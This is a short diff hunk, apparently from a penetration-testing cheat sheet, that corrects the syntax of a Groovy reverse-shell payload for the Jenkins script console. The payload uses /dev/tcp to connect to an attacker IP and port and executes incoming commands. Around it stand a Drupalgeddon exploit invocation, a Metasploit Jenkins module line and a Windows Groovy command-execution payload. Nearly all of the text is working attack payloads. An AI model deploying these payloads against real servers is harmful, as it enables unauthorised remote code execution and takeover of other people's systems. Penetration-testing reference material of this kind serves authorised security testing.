@@ -1102,7 +1102,7 @@ $ python2.7 drupalgeddon.py -t <URL> -u hacker -p pwnd
 http://<IP address>:<port>/script
 msf6 > use exploit/multi/http/jenkins_script_console
 # Linux Groovy script console reverse shell payload
-r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP address>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
+r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP address>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
 # Windows Groovy script console command execution payload
 def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
 # Windows Groovy script console reverse shell payload
